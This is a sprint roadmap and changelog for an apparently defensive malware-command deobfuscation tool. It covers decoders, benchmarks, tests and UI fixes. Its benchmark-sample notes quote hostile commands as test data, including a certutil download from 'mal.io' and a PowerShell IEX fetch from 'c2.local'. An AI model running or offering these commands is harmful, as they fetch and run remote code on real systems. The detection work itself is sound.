# NivXRay — Sprint Roadmap (v1.6.0 · Deterministic-First Pivot)

**Locked direction (from `Ideas_updated.docx` · Feb 2026 · reaffirmed with user 2026-02-20)**:

> **NivXRay's core capability is FULLY DETERMINISTIC. AI is an optional enhancement — never a dependency.**
>
> - ✅ The tool must produce **accurate verdicts, decoded payloads, MITRE mappings, IOCs, behavior analysis, and confidence WITHOUT AI**.
> - ✅ AI should only provide **narrative polish, executive summaries, and analyst assistance**.
> - ✅ **If AI is disabled or unavailable, the tool functions at full technical capability.** No degraded state.
>
> **Enforcement mechanism (RC3.0):**
> - Default persona is **`PLAIN · Deterministic (no AI)`** — no auto-selection of `NivX Cognis`.
> - Analyst opts IN to AI narrative by picking a persona explicitly.
> - Every technical panel (Verdict · Recovered Payload · Chain Recipe · MITRE · IOCs · Network · Behavior) populates identically whether AI is engaged or not.
> - Any future feature that introduces an AI dependency into the CORE pipeline is a P0 architectural violation — it must be refactored to run rule-based/deterministic with AI as an opt-in overlay.

## 🎯 NEXT-SESSION EXECUTION ORDER

**Order confirmed by user after production validation showed OUTPUT + VERDICT populating in one blink on PLAIN mode:**

### ✅ D · P0 · Freeze RC3.0 baseline corpus + CI gate  ← DELIVERED (RC3.0, refreshed to RC3.1)
### ✅ A · P1 · Cloudflare origin-parse error on async enrichment tail  ← DELIVERED (RC3.1 · Feb-2026)
### ✅ B · P1 · Cosmetic polish — terminal-layer RECOVERED downgrade  ← DELIVERED (RC3.1 · Feb-2026)
### ✅ C · P1 · Verdict precision 15/31 → ≥ 90 %  ← DELIVERED (RC3.1 · 29/31 = 93.5 %)
### ✅ H · P1 · IR Handoff Export (.md / .pdf)  ← DELIVERED (RC3.1 · Feb-2026, MD + PDF + JSON + STIX 2.1)

### 🟡 Currently open

### E · P1 · Golden-fixture regression battery  ← NEXT
- Golden input → golden output in `/app/backend/tests/fixtures/plugin_regression/` for every plugin
- Parametrised pytest, feeds the CI gate. `html_unicode_escape` fixture is already in place as the reference implementation.

### F · P1 · Phase C.5 · Obfuscation Coverage Sprint (partially delivered in RC3.1)
- ✅ HIGH · Unicode escapes (`\u0041`), HTML entities (`&#65;`)  — RC3.1
- MED · Base32 / Base58 / Base85 / Base91  ← already in codebase, add explicit tests
- MED · UUID-encoded shellcode, IPv4/IPv6-encoded shellcode
- MED · ChaCha20 / AES-GCM / DES / 3DES (reuse `crypto_hints._ALGO_SPECS`)
- BONUS · JSE/VBE

### G · P1 · Enrich `crypto-key-required` tradecraft
Structured JSON with algorithm, encoding, key_len_bits, iv_len_bits, nonce_required, confidence.

### Then · Phase D · Malware-family detectors (XWorm / RedLine / FormBook / NjRAT / Emotet)

### 🛡️ Phase R · Robustness Hardening (parallel track — full detail in ROADMAP.md)
Cross-cutting enterprise-grade capabilities that slot in after the numbered sprint completes, prioritised by customer pull:
- **R.1** External intel: VirusTotal · OTX · MISP · Triage sandbox · Slack/Teams webhooks
- **R.2** Detection engineering: Sigma + YARA rule export from decoded cases
- **R.3** Tradecraft detectors: AMSI/ETW bypass · sandbox-detection · registry/scheduled-task persistence · DGA heuristic
- **R.4** Enterprise: RBAC · immutable audit log · API tokens · multi-tenant workspaces · Prometheus metrics
- **R.5** Payload types: VBA macros · LNK · Excel-4.0 · PDF JS · HTA/MSI/ISO container unpacking


---
## 🟢 RC3.1 · Verdict Precision + IR Handoff + P1 hot-fixes · DELIVERED (2026-02-21)

**Branch:** `feature/rc2` · **Scope:** verdict precision 15/31 → 29/31 (93.5 %) · Cloudflare origin-parse fix · Terminal `BROKEN` → `RECOVERED` · IR Handoff Export UI (MD/PDF/JSON/STIX) · HTML entity + JS `\uXXXX` decoder · 9 new regression tests.

**CI gate (RC3.1 lock.json):** 116/116 pytest · 96.8 % chain-completeness · 29/31 verdict precision · 500 ms avg latency · 0 false-positive IOCs.

Full detail: `/app/memory/CHANGELOG.md#rc31`.


---
## 🟢 RC3.0 · Symmetric-Crypto Pack + Verdict Hardening + 7-Panel UI · DELIVERED (2026-02-20)

**Branch:** `feature/rc3` · **Scope:** Backend crypto plugins + verdict-card hardening + Analyst Workspace UX refactor
**Benchmark evidence:** `/app/backend/tests/rc23_benchmark/run_benchmark.py` → **30/31 chain-complete (96.8%)** held; verdict precision improved **14→15/31**; **107 tests pass** including 14 new crypto tests + 10 verdict-null tests.

### P0.1 · Verdict Card never null · Findings-aware classification
- **`build_verdict_card` never returns None.** Any internal exception is caught, logged via `log.exception(...)`, and swapped for a structured `_fallback_card(_FALLBACK_REASON)` — the analyst UI only ever sees the GENERIC message "Automated verdict generation failed. Manual analyst review recommended." Raw exception details never leak.
- **`ops.py` exception paths use `_fallback_card`.** Both the first-pass build and the post-enrichment rebuild return a structured card on any failure — zero `verdict_card = None` assignments remain in the codebase.
- **Findings-aware classification.** `_classify` now escalates to Malicious on `URL indicator` / `LOLBAS binary` / `Malware family match` and Suspicious on ≥3 MITRE techniques. Post-enrichment rebuild re-runs the verdict with the full IOC/MITRE/LOLBAS surface so payloads previously stuck at "Suspicious @30 %" now correctly surface as "Malicious @80–90 %".

### P0.2 · Analyst Workspace 7-panel UI (`AnalystResults.jsx`)
- **New components:** `RecoveredPayloadCard.jsx` + `AnalystResults.jsx` (with sub-panels VerdictPanel / ChainRecipePanel / MitrePanel / IocPanel / NetworkPanel / BehaviorPanel).
- **Locked panel order:** ① Analysis Verdict → ② Recovered Payload → ③ Chain Recipe → ④ MITRE → ⑤ IOCs → ⑥ Network → ⑦ Behavior.
- Every panel: sticky header, collapse/expand toggle, copy-to-clipboard, `data-testid` per panel + per interactive element.
- Verdict panel populates from `/decode/smart`'s `verdict_card` immediately (previously required a second async job).

### P0.3 · Symmetric-Crypto Pack (RC4 / AES-CBC / AES-ECB + `crypto-detect`)
- **`/app/backend/crypto_hints.py`** — Single-artifact key/IV extractor + structural ciphertext shape detector. NEVER cross-request, NEVER brute-force.
- **`/app/backend/decoders/crypto_symmetric.py`** — Three new orchestrator plugins:
  - `rc4-decrypt` · deterministic RC4 decrypt when a key literal (`$key='…'`, `password="…"`, byte-array) is present in the same artifact.
  - `aes-cbc-decrypt` · deterministic AES-128/192/256 CBC + ECB decrypt with inline key + IV recovery.
  - `crypto-detect` · signal-only structural detector — flags ciphertext-shaped blobs and emits a `crypto-key-required` tradecraft flag when no inline key is present, even if decryption isn't possible.
- **Manual Chain-Recipe UI** — analyst-typed `key`/`iv`/`mode` args flow through the same wrappers via `key`/`iv`/`mode` slots (already exposed by `ops_extended.py`); wrapper merges analyst args over detect() output.
- **Auto-decrypt policy** — enforced: auto-decrypt ONLY when key is deterministically recovered from the same artifact AND plaintext ≥ 70 %-printable; otherwise return original payload + KEY REQUIRED tradecraft with detected algorithm and required inputs.

### `run_operation` args-filter hardening
- Introspects each op's signature and drops kwargs the function doesn't accept — fixes cascade errors like "`_b64_decode() got an unexpected keyword argument 'urlsafe'`" that surfaced when the orchestrator's plugin detect() args were replayed into legacy ops.

### Unit tests
- `/app/backend/tests/test_verdict_card_never_null.py` — 10 tests (MITRE-only, IOC-only, IncidentL full-findings, benign, empty, malformed chain, malformed findings, corrupted container, chain-only).
- `/app/backend/tests/test_crypto_symmetric.py` — 14 tests (inline-key auto-decrypt for RC4/AES; KEY REQUIRED emission when key absent; analyst-supplied key acceptance; no-brute-force lock; crypto-detect signal-only behaviour; hint extractor precision).

---

## 🟢 RC2.9 · Chain-Recipe Wrappers + Runaway Guard + `ps-hex-escape` · DELIVERED (2026-02-20)

**Branch:** `feature/rc2` · **Scope:** Backend engine — new decoder, manual runner parity, DoS guard
**Benchmark evidence:** `/app/backend/tests/rc23_benchmark/run_benchmark.py` → **30/31 chain-complete (96.8%)** held; **83 tests pass** including new `test_rc29_gap_close.py` (15) and `test_runaway_guard.py` (4).

### Added
- **`ps-hex-escape` plugin decoder** (`/app/backend/decoders/ps_hex_escape.py`). Detects & decodes `\xNN` / `\\xNN` C-style byte-escape streams that appear in PowerShell obfuscators (Invoke-PSObfuscation) and December_Commandline-class payloads. Precision-first: only fires when ≥10 escapes AND density ≥ 40 %, with a printable-ratio dry-run guard.
- **Manual Chain-Recipe wrappers for 9 plugin decoders** (`/app/backend/operations.py :: _register_plugin_op`). Every plugin ID reachable from the recursive engine is now also dispatchable from the analyst UI via `/api/recipe/run`. Closes the "Unknown operation: ps-reconstruct" P0 bug. Wrappers forward to the same plugin implementation — zero drift between auto-investigate and manual mode. Ops: `ps-reconstruct`, `cmd-reconstruct`, `js-reconstruct`, `vbs-reconstruct`, `decimal-charcode-decode`, `octal-charcode-decode`, `custom-hex-slash`, `nibble-swap`, `ps-hex-escape`.
- **Runaway loop / DoS guard** (`/app/backend/engine/orchestrator.py`). Three-layer defence against Cloudflare 524 timeouts on pathological payloads:
  1. **Pre-fingerprint gate**: payloads > 8 MB short-circuit in <1 ms with `terminal="budget"`, preserving the first 2 KB as an analyst preview.
  2. **Per-layer input gate**: same 8 MB cap re-checked before candidate discovery each iteration.
  3. **Hard-abort budget**: pipeline aborts if cumulative wall-time ≥ 20 s regardless of per-plugin budgets.
  Slow-decoder warn log (>8 s per call) added for observability.

### Fixed
- **P0** `/api/recipe/run` no longer returns `"Unknown operation: ps-reconstruct"` for any plugin-based decoder ID.
- Manual Chain-Recipe output is now byte-identical to orchestrator output for the same op — locked by `test_manual_runner_matches_plugin_runner_for_ps_hex_escape`.

### Unit tests
- `/app/backend/tests/test_rc29_gap_close.py` — 15 tests locking plugin/manual-runner parity + `ps-hex-escape` precision.
- `/app/backend/tests/test_runaway_guard.py` — 4 tests locking the DoS guard.

---


## 🟢 RC2.8 · JS + VBScript Reconstruction · DELIVERED (2026-02-XX)

**Branch:** `feature/rc2` · **Scope:** Backend engine — two new decoders
**Benchmark evidence:** `/app/memory/rc28_js_vbs.json` — **30/31 chain-complete (96.8%)** up from 26/31 (83.9%) · **+12.9pp** · zero false-positive IOCs · **101/101** unit tests pass.

### Added
| Decoder | Signals | Detail |
|---------|---------|--------|
| `js-reconstruct` | `String.fromCharCode(N,N,...)`, `atob('base64')`, `unescape('%XX')` | Rewrites the primitive; keeps surrounding `eval()`/`Function()` wrapper for downstream extractors. Multi-signal conf 0.9 · single 0.85. |
| `vbs-reconstruct` | `Chr()/ChrW()` chain, `CreateObject("ProgID")` | Chains collapse to a quoted literal; ProgIDs revealed via `<#=> ... <#=>` marker so IOC/MITRE extractors key on `WScript.Shell`, `MSXML2.XMLHTTP`, etc. Confidence **0.96–0.97** to beat extract-wrapper's cmd /c heuristic (0.95). |

### Fixed benchmark samples (+4)
- `js-fromcharcode` → chain-complete (`alert`, `xss` surface)
- `js-atob` → chain-complete (`alert`, `pwned` surface)
- `vbs-chr` → chain-complete (`MsgBox`, `pwned` surface)
- `vbs-createobject` → chain-complete (`WScript.Shell`, `cmd.exe` surface)
- Categories now: JavaScript 3/3 · VBScript 2/2 · **all 100 %**.

### Unit tests
`/app/backend/tests/test_js_vbs_reconstruct.py` — 15 tests locking:
- JS: fromCharCode (dec + hex args), atob, unescape, binary-blob guard, precision detect
- VBS: Chr chain, ChrW unicode, CreateObject reveal, confidence-beats-extract-wrapper
- Zero-false-positive-IOC gate for both


---

## 🟢 RC2.7 · CMD Reconstruction · DELIVERED (2026-02-XX)

**Branch:** `feature/rc2` · **Scope:** Backend engine — new `decoders/cmd_reconstruct.py`
**Benchmark evidence:** `/app/memory/rc27_cmd.json` — **26/31 chain-complete (83.9%)** up from 25/31 (80.6%) · **+3.3pp** · zero false-positive IOCs · **86/86** unit tests pass.

### Added — new deterministic decoder `cmd-reconstruct`
| # | Feature | Detail |
|---|---------|--------|
| 1 | `%VAR%` classic expansion | Multi-pass (`%A%%B%` cascades). Only fires when a matching `SET VAR=...` exists in the same payload — `%TEMP%` stays literal. |
| 2 | `!VAR!` delayed expansion | For `cmd /V:ON` blocks. Multi-pass for nested resolution. |
| 3 | Caret escape stripping | `c^m^d.exe` → `cmd.exe`. Preserves `^` at end-of-line (real CMD line-continuation). |
| 4 | `CALL FOO` reveal | Appends resolved literal inline via `<#=> ... <#=>` marker so LOLBAS names reach IOC/MITRE extractors even through CALL indirection. |
| 5 | Confidence tuning | Combo signals hit conf 0.9 (beats extract-wrapper 0.65) so reconstructed LOLBAS binaries surface. |

### Fixed benchmark sample
- `cmd-delayed-expansion`: `cmd /V:ON /c "set A=cert&& set B=util&& !A!!B!.exe -urlcache -f http://mal.io/x.exe"` → chain-complete (was incomplete). CMD category now 3/3 (100%).

### Unit tests
`/app/backend/tests/test_cmd_reconstruct.py` — 12 tests locking:
- Delayed expansion end-to-end + direct-call
- Percent-var single, nested cascade, unresolved-stays-literal
- Caret collapse + eol-caret preservation
- CALL-of-var reveal
- Detection precision guards (no false positives on plain env-vars or benign text)
- Zero-false-positive-IOC gate


---

## 🟢 RC2.6 · PowerShell P0.3 Reconstruction · DELIVERED (2026-02-XX)

**Branch:** `feature/rc2` · **Scope:** Backend engine — `decoders/ps_reconstruct.py` only
**Benchmark evidence:** `/app/memory/rc26_p03.json` — 25/31 chain-complete (80.6%) up from 24/31 (77.4%) · **+3.2pp** · zero false-positive IOCs · zero regressions on 74/74 unit tests.

### Added
| # | Feature | Detail |
|---|---------|--------|
| P0.3.a | Reconstruct-then-invoke confidence boost | When payload has both a reconstruction signal (`-join`, `-f`, `[char]`, `.Replace`, `[ScriptBlock]::Create`) AND `& $var` / `IEX $var` / `Invoke-Expression $var`, ps-reconstruct hits conf 0.9 so it beats extract-wrapper (0.65) and `IEX` / other reconstructed keywords surface to MITRE + IOC extractors. |
| P0.3.b | `[ScriptBlock]::Create('...')` unwrap | Peels `[ScriptBlock]::Create()`, `[scriptblock]::Create()`, and fully-qualified `[System.Management.Automation.ScriptBlock]::Create()` into a plain string literal for downstream passes. |
| P0.3.c | Invoke-var reveal | After all reconstruction, appends the resolved variable literal inline (via `<#=> '...' <#=>` marker) after `& $var` / `IEX $var` invocations so keywords surface without corrupting analyst copy-paste. |

### Fixed benchmark sample
- `ps-join-obfuscation`: `$a = ('I','E','X') -join ''; & $a http://c2.local/s.ps1` → chain-complete (was incomplete because extract-wrapper stripped IEX from the final output). PowerShell category now 6/6 (100%).

### Unit tests
`/app/backend/tests/test_ps_reconstruct_p03.py` — 14 tests locking:
- Reconstruct-then-invoke wins the orchestrator race (integration test)
- `[ScriptBlock]::Create` unwrap (3 variants — single-quote, double-quote, fully-qualified type)
- Invoke-var reveal (3 patterns: `& $var`, `IEX $var`, `Invoke-Expression $var`)
- Precision guards (no-op when no assignment; confidence low for plain backtick)
- RC2.3 P0.1/P0.2 behaviours (char decimal/hex, -join array, -f operator, .Replace) still work


---

## 🟢 RC2.5 · CONFIDENCE-BADGE FIX · DELIVERED (2026-02-XX)

**Branch:** `feature/rc2` · **Scope:** UI/frontend only — engine untouched
**Test evidence:** `/app/test_reports/iteration_17.json` (2/3 panels live-verified in DOM, 3rd verified by code review · zero `0% CONFIDENCE` matches after fix)

**Fixed:** The misleading "0% CONFIDENCE" badge on three surfaces that made the analyst distrust the SOC Verdict (which shows 70%+ correctly). Applied the same `hasConf = Number.isFinite(confidence) && confidence > 0` guard RC2.4 introduced for chain-mode headers.

| # | File | Fix |
|---|------|-----|
| 1 | `frontend/src/components/DecodingTracePanel.jsx` (line 132-150) | Show `CONF · N/A · DECODED` when trace decoded ok but confidence=0/null |
| 2 | `frontend/src/components/InvestigationGraph.jsx` (line 265-280) | Same guard on the Investigation Graph header badge |
| 3 | `frontend/src/components/SocVerdictPanel.jsx` (line 55-75, 127) | `n/a · decoded` in SOC-ticket string + Confidence VerdictField |

The backend-computed `VerdictCard` (workspace-verdict-card) is unrelated and still shows its true score.

**Cleanup (partial · 5/50+ files):** Removed hardcoded admin password from 5 test scripts flagged in the handoff. Replaced with `os.environ.get("ADMIN_PASSWORD")` fail-fast pattern:
- `backend/scripts/capture_docs_screenshots.py`
- `backend/tests/daily_regression.py`
- `backend/tests/extensive_regression.py`
- `backend/tests/live/run_docx_buttons.py`
- `backend/tests/stress_deploy_ready.py`

⚠️ **~45 more backend test files still contain the hardcoded password** — see `ROADMAP.md` for the deferred bulk-cleanup task.


---

## 🟢 RC2.4 · UI POLISH · DELIVERED (2026-07-19)

**Branch:** `feature/rc2` · **Ships on:** next Emergent deploy
**Scope:** UI/frontend only — engine untouched, zero decoder changes

**Fixed (both bugs the user saw on prod screenshot):**

1. **Terminal-decode banner** replaces binary-tail garbage in TEXT view
   - New `detectTerminalTail()` heuristic (`OutputView.jsx`)
   - TEXT view now shows only the clean head
   - Raw bytes remain fully in HEX / B64 views (evidence preserved)
   - Amber banner: "TERMINAL DECODE STATE · Partial reconstruction complete · Remaining N bytes appear binary/encrypted/unsupported"
   - "INSPECT HEX" button pivots analyst directly to raw view

2. **"conf 0/100" misleading display** — fixed
   - Chain-mode stage header now shows `conf=n/a · decoded` when stage returned content but no confidence value
   - Flat-decode status pill: same treatment
   - No longer suggests "0% confidence" when engine actually recovered commands + IOCs + LOLBAS + MITRE

**Commits:**
- `87c091d` feat(ui/RC2.4): terminal-decode banner
- `da9d2b9` fix(ui/RC2.4): stop showing misleading 'conf 0/100' when decode succeeded

**Deferred to RC2.5+ (per user roadmap, `/app/memory/ROADMAP.md`):**
- Separate "Recovered Payload" panel from Investigation Summary
- Dedicated Recovered Commands card with copy button
- Full Decode vs Threat confidence split (currently unified fix)

---



**Branch:** `feature/rc2` · **Tag proposal:** `v1.0.0-RC2.3`
**Approach:** measurement-first; every change gated by the RC2.3 chain-completeness benchmark
**Baseline reference:** `/app/memory/rc22_pre_changes.json` (pre-my-changes = 19/31 · 61.3%)

**Delivered this session (8 atomic commits, benchmark-verified):**

| # | Commit | Change | Bench delta |
|---|---|---|---|
| 1 | `fda4390` | perf(xor-brute): polish-pass gating | -8ms avg |
| 2 | `9bdd8c9` | feat: Brotli plugin + benchmark harness | 0 regressions |
| 3 | `fbfe08e` | chore: gitignore rc23_benchmark pycache | — |
| 4 | `10534c0` | feat: LZMA/XZ plugin | 0 regressions |
| 5 | `541777c` | feat: Zstd plugin | 0 regressions |
| 6 | `f0ad465` | feat: Caesar cipher (shift 1-25) plugin | 0 regressions |
| 7 | `38fd46d` | feat(ps-reconstruct P0.1): `.Replace()` + `$var` expansion | +1 sample |
| 8 | `8d8e1a1` | feat(ps-reconstruct P0.2): `-join` + `-f` format op | +1 sample |

**Final benchmark evidence** (`/app/memory/rc23_after_p02.json`):
- **Chain-complete: 24/31 (77.4%)** — up from 19/31 (61.3%) = **+16.1pp**
- **False-positive IOCs: 0** across every run — precision maintained
- p50 = 0ms · p95 = 784ms · Avg = 303 ms · **87% of samples under 500ms target**
- Unit tests: **48/48 pass** on my delta scope

**Frozen items — next sprint (in priority order per user):**
1. PowerShell P0.3 — `[char]` polish, ScriptBlock reconstruction, IEX-of-var chains
2. CMD reconstruction — `!DELAYED!`, nested `%VAR%`, `SET`/`CALL`/`FOR /F`
3. JavaScript reconstruction — `atob`, `String.fromCharCode`, `unescape`, `eval`
4. VBScript reconstruction — `Chr`, `ChrW`, `Execute`, `CreateObject`
5. Analyst Workspace UX — Decode Outcome badge, Decode Status banner, Recovered-Command panel
6. XOR 9-16 byte key extension
7. Phase D new families (XWorm, NjRAT, RedLine, FormBook, Emotet)

**Benchmark harness:** `/app/backend/tests/rc23_benchmark/`
- `__init__.py` — 31 curated samples across 12 categories (Base64, XOR, Compression, PowerShell, CMD, LOLBAS, Multi-Stage, Phishing, Benign, Regression, JavaScript, VBScript)
- `run_benchmark.py` — chain-completeness + per-category summary + JSON export
- `profile_latency.py` — p50/p95/p99 + per-plugin aggregate timing

**Recommendation:** wire `run_benchmark.py` into CI as a required pre-merge gate. Any future PR that drops chain-completeness below 77.4% or introduces false-positive IOCs will fail automatically.

---

## 🟢 RC2.2+ · DELIVERED — 2026-07-19 (Post-fork continuation)

**Branch:** `feature/rc2`
**Approach:** measurement-first; every change gated by the RC2.3 chain-completeness benchmark
**Baseline:** `/app/memory/rc22_pre_changes.json` (RC2.2 pre-my-changes = 19/31 · 61.3%)

**Delivered this session (per-decoder atomic commits):**

| Commit | Impact | Test result |
|---|---|---|
| `perf(xor-brute): gate polish pass` | -8ms avg latency | 48/48 tests ✅ |
| `feat: Brotli decompress plugin + benchmark harness` | +1 codec | 0 regressions ✅ |
| `feat: LZMA/XZ decompress plugin` | +1 codec | 0 regressions ✅ |
| `feat: Zstd decompress plugin` | +1 codec | 0 regressions ✅ |
| `feat: Caesar cipher (shift 1-25) plugin` | +1 codec | 0 regressions ✅ |

**Benchmark evidence (`/app/memory/rc23_*.json`):**
- **Chain-complete: 22/31 (71.0%)** — up from 19/31 (61.3%) pre-RC2.2+
- **False-positive IOCs: 0** across all runs
- **p50 = 0 ms · p95 = 784 ms · Avg = 285 ms · Under 500ms target: 27/31 (87%)**

**Failing samples (drives Phase A remaining work):**
- `ps-join-obfuscation` / `ps-format-operator` / `ps-replace-obfuscation` → needs PS reconstruction (Phase A6)
- `cmd-delayed-expansion` → needs CMD `!DELAYED!` expander (Phase A7)
- `xor-11byte-b64` → needs 9-16 byte XOR extension (Phase A2)
- `js-fromcharcode` / `js-atob` → Phase B (JavaScript runtime)
- `vbs-chr` / `vbs-createobject` → Phase B (VBScript runtime)

**Benchmark harness:** `/app/backend/tests/rc23_benchmark/`
- `__init__.py` — 31 curated samples across 12 categories
- `run_benchmark.py` — chain-completeness runner with per-category summary
- `profile_latency.py` — p50/p95/p99 + per-plugin aggregate timing

---



**Branch:** `feature/rc2` · **Tests:** 15/15 new + 46/47 legacy regression green
**Release notes appended to CHANGELOG below**

RC2.2+ delivers on the 4-task hardening list the user explicitly requested:

1. **XOR-brute extended to 8-byte keys** (`decoders/xor_brute.py`)
   - Frequency-weighted per-column English scoring (space + all letters + digits + punctuation)
   - Iterative polish pass — re-evaluates every column against the full-plaintext score to recover near-miss key bytes
   - Verified: recovers 5-byte (`K3yPs`) and 7-byte (`S3v3nBt`) keys from base64(xor(cmdline)) chains

2. **Network + LOLBAS combo verdict bump** (`engine/orchestrator.py::_compute_confidence_breakdown`)
   - +15 risk contribution when LOLBAS binary is paired with any external IOC (URL/IP/domain) — the canonical download-and-execute pattern (T1105)
   - New RiskContribution source: `network-lolbas-combo`

3. **Residual-obfuscation tail-trim / retry** (`engine/orchestrator.py::_trim_tail_garbage`)
   - Post-decode pass detects clean-head + binary-tail split
   - Retries every decoder plugin on the tail; if none recovers, cleanly truncates with a visible truncation note
   - Unicode-aware printable check keeps box-drawing/CJK output intact

4. **STIX 2.1 export from AnalystReport** (`engine/stix_exporter.py`, `routers/analyst_v2.py`)
   - New `GET /api/v2/analyze/report?fmt=stix` returns a full OASIS STIX 2.1 bundle (identity, malware, attack-patterns, indicators, SCOs, observed-data, relationships, note, report)
   - Compatible with OpenCTI, MISP, Sentinel, Splunk ES, QRadar, ThreatConnect, Anomali, ThreatQuotient

Regression tests: `/app/backend/tests/test_rc22_xor8_lolbas_stix.py` (15 tests).


---

## 🟢 RC2.0 · SHIPPED TO PRODUCTION — 2026-07-19

**Live URL:** https://nivxray.nivxforge.com
**Branch:** `feature/rc2` (deployed & GitHub-pushed)
**Local tests:** 126/126 green · **Production authenticated smoke:** ✅ passed
**Full evidence:** `/app/memory/DEPLOYMENT_EVIDENCE.md` + `/app/memory/evidence/` (17 screenshots + 4 exports + curl/pytest transcripts)

RC2.0 delivers:
- PDF export (`reportlab`) — 3-page branded report, all 11 sections, byte-stable
- 4 export formats end-to-end (MD/JSON/TXT/PDF) served from `POST /api/v2/analyze/report?fmt=…`
- UI branding: `</> NivXRay v1.0 · MCIP`, nav = Analyst Workspace / Regression Battery / Investigator (zero "Legacy Workspace")
- 12 registered plugins (base32, base64, base91, ascii85, gzip, hex, rot13, rot47, url, xor-brute, zlib-deflate, extract-wrapper)
- Meterpreter PS-wrapper → `family-identified` in <1.1s on prod (verdict=malicious · risk=95 · chain=`[extract-wrapper→base64-decode→xor-brute]` · C2 IP `149.28.81.19`)

## 🟢 RC2.1a · SHIPPED TO PRODUCTION — 2026-07-19

**Live URL:** https://nivxray.nivxforge.com (RC2.1a checkpoint layered on RC2.0)
**Deploy timestamp:** 2026-07-19T09:04Z
**Tests:** 124/124 green (46 new · zero regressions)
**Production authenticated smoke:** ✅ passed (2 families × 4 export formats)
**30-min watch:** ✅ 30/30 iters (29 OK · 1 transient CF-520 blip · 6/6 analyze probes malicious)
**Full evidence:** `/app/memory/DEPLOYMENT_EVIDENCE.md` §12
**Release notes:** `/app/memory/RELEASE_NOTES_v1.0.0-RC2.1a.md`
**Rollback plan:** `/app/memory/RC2.1a_ROLLBACK_PLAN.md`
**Recommended tag:** `v1.0.0-RC2.1a`

RC2.1a delivers **Malware Family Intelligence** as first-class MCIP output:
- 9 deterministic family plugins (Meterpreter, AsyncRAT, Lumma, DarkGate, Remcos, AgentTesla, QuasarRAT, Cobalt Strike, Snake Keylogger)
- Weighted-signature confidence scoring
- Structured `EvidenceItem` list per detection
- Per-family MITRE ATT&CK mapping (4-5 techniques each)
- Auto-generated YARA rule stubs (`APT_*` for targeted, `MAL_*` for commodity)
- Atomic-Red-Team pointers
- Post-decode intelligence pass with terminal-state promotion
- Backwards-compatible API (all existing fields preserved)

## 🟢 RC2.2+ · SHIPPED — 2026-07-20 (Workspace ↔ Orchestrator Unification)

**Branch:** `feature/rc2` · **Tests:** 214/214 engine green (86 new · zero regressions)
**Safepoint tag:** `v1.0.0-RC2.2-safepoint-20260719-122658`

### 🔥 Workspace + Batch Analyst now share ONE decoder engine

Fixes the Prod bug where `AUTO INVESTIGATE` on the Workspace tab showed
`BENIGN 0/100 · No techniques matched` for the SAME payload that Batch
Analyst decoded to `MALICIOUS · 90 · http://evil.xyz`.

`analysis_core.deterministic_best_decode()` now runs a **preflight through
the new RC2.2 Orchestrator** before falling back to the legacy smart/magic
race. When the orchestrator produces ≥2 layers with a clean terminal state,
its result is adopted verbatim — same output shape (so no frontend break),
but with RC2.2 plugins in the chain (`custom-hex-slash`, `nibble-swap`,
`reverse-string`, `ps-reconstruct`, `utf16-decode`, `data-uri-extract`,
`ioc-extractor`, `python-exec` wrapper, family plugins).

Adapter module: `backend/rc22_adapter.py`
Test lock: `backend/tests/test_rc22_workspace_adapter.py` (6 tests)

### Sophisticated 8-layer chain still holds
Real production sample (`Sample_Commandline.rtf`) chain:
`powershell -e → base64 → custom-hex-slash → nibble-swap → reverse-string →
base64 → url-decode → cmd/certutil wrapper → ioc-extractor` → `MALICIOUS 90`.

### Python exec wrapper (2026-07-20 late)
Real customer bug: `python -c "exec(__import__('base64').b64decode(b'…').decode())"`
was scoring `BENIGN 0/100`. Added regex + T1059.006 (Python) + python.exe LOLBAS
+ `python-exec-b64` HIGH tradecraft flag. Now scores `SUSPICIOUS 67`.
Test lock: `backend/tests/test_python_exec_wrapper.py` (5 tests).

## 🟡 Next up · RC2.1b · STIX 2.1 Bundle Export (1.5 days)

`GET /api/v2/analyze/report?fmt=stix` — validated against MISP · OpenCTI · ThreatConnect · MS Sentinel · Splunk ES
- RC2.3 · Advanced PS reconstruction (`-f` format, `${env:X}`, tick-strip, case-normalize)
- RC2.4 · Advanced CMD reconstruction (`%var%`, `!DELAYED!`, `for /f`)
- RC2.5 · Golden Corpus (200-1000 real samples + YAML schema + CI gate)

Cleanup items:
- Re-evaluate 5 `xfail` corpus samples in `test_training_corpus.py`
- Purge legacy `operations.py` + `wrapper_archetypes.py` (functionality now in plugin engine)


---

---

## Product Vision — Malware Command Intelligence Platform (MCIP) · Feb 2026

NivXRay is NOT another CyberChef, EDR, or Sandbox. It creates its own category:
**Malware Command Intelligence Platform** — turning unknown encoded/obfuscated
commands into analyst-ready intelligence. Positioning:

- CyberChef → decodes bytes.
- **NivXRay → understands the command.**

Every paste → automatic, deterministic, offline **Analyst-Ready Intelligence Report**:
Input → Recursive Decode → Pattern Detection → IOC Extraction → MITRE Mapping →
LOLBAS Detection → Malware Family Heuristics → Analyst Findings → Executive
Summary → Final SOC Report.

Engineering priority order: Maintainability > Extensibility > Deterministic
Accuracy > Performance > Offline Capability > Analyst Productivity.

AI must never become a dependency; it may only *enhance* the deterministic report.

## Session 2 · Phase A — DONE (commit `666fbf2` on `feature/plugin-decoder-engine`)

Plugin-based decoder engine scaffold with vision-aligned MCIP schema. All
additive — legacy `deterministic_best_decode` remains default via
`NIVX_ENGINE=legacy`. New engine opt-in via `NIVX_ENGINE=orchestrator`.

| # | Deliverable | File(s) |
|---|---|---|
| A1 | Layered engine primitives (Budget, AnalysisContext, TraceBuffer, Fingerprint) | `engine/models.py`, `engine/fingerprint_util.py` |
| A2 | Plugin contract with universal `PluginResult` (output + iocs + mitre + family + lolbas + tradecraft + recommendations + explain) | `engine/decoder_base.py`, `engine/models.py` |
| A3 | Auto-discovering `DecoderRegistry` (thread-safe, ranked by confidence + cost) | `engine/registry.py` |
| A4 | Recursive `Orchestrator` with budget-enforced depth/time/branch caps + Findings aggregation + deterministic executive summary + investigation recommendations | `engine/orchestrator.py` |
| A5 | 3 pilot decoders migrated to plugin contract | `decoders/base64.py`, `decoders/hex.py`, `decoders/url.py` |
| A6 | Feature flag `NIVX_ENGINE` + env-tunable budget | `engine/config.py`, `.env` |
| A7 | Regression locks 15→17 + 23 new Phase A engine tests (40/40 green) | `tests/test_regression_lock.py`, `tests/test_engine_phase_a.py` |
| A8 | Backwards-compat aliases `DecodeResult == PluginResult`, `DecodeOutcome == AnalystReport` | `engine/__init__.py` |

**Phased Session 2 plan:**
- Phase A · Foundation ✅ **DONE**
- Phase B · Migrate 14 remaining decoders (batches of 3–5 with regression gates)
- Phase C · New capabilities (ascii85, base91, brotli, lzma, `stopped_reason` UX)
- Phase D · Frontend `DecodingTracePanel` rewrite (Fingerprint card + why-stopped chip)
